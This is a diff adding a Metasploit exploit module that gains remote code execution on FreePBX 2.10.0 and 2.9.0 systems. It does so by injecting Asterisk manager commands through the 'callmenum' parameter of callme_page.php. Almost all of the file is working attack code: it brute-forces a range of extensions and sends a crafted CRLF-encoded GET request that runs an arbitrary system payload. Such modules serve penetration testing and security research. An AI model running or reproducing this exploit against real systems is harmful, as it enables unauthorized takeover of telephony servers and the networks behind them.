@@ -1,0 +1,84 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ManualRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution',
+			'Description'    => %q{
+				This module exploits FreePBX version 2.10.0,2.9.0 and possibly older.
+				Due to the way callme_page.php handles the 'callmenum' parameter, it
+				is possible to inject code to the '$channel' variable in function
+				callme_startcall in order to gain remote code execution.
+
+				Please note in order to use this module properly, you must know the
+				extension number, which can be enumerated or bruteforced, or you may
+				try some of the default extensions such as 0 or 200.  Also, the call
+				has to be answered (or go to voice).
+
+				Tested on both Elastix and FreePBX ISO image installs.
+			},
+			'Author'         => [ 'muts','Martin Tschirsich' ],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					[ 'URL', 'http://www.exploit-db.com/exploits/18649/' ]
+				],
+			'Platform'       => ['unix'],
+			'Arch'           => ARCH_CMD,
+			'Privileged'     => false,
+			'Payload'        =>
+				{
+					'Space'       => 1024,
+					'DisableNops' => true,
+				},
+			'Targets'        =>
+				[
+					[ 'Automatic Target', { }]
+				],
+			'DefaultTarget'  => 0,
+			'DisclosureDate' => 'Mar 20 2012'))
+
+		register_options(
+			[
+				OptString.new("EXTENSION", [ true, "A range of Local extension numbers", "0-100" ]),
+			], self.class)
+	end
+
+	def exploit
+		# Check range input
+		if datastore['EXTENSION'] =~ /^(\d+)\-(\d+)$/
+			min = $1.to_i
+			max = $2.to_i
+		else
+			print_error("Please specify a range for option 'EXTENSION'")
+			return
+		end
+
+		cmd = Rex::Text.uri_encode(payload.encoded)
+
+		(min..max).each do |e|
+			connect
+			print_status("#{rhost}:#{rport} - Sending evil request with range #{e.to_s}")
+			res = send_request_raw({
+				'method' => 'GET',
+				'uri' => "/recordings/misc/callme_page.php?action=c&callmenum="+e.to_s+"@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20#{cmd}%0D%0A%0D%0A",
+				'version' => '1.0',
+				'vhost'   => rhost
+			})
+			handler
+			disconnect
+		end
+	end
+
+end
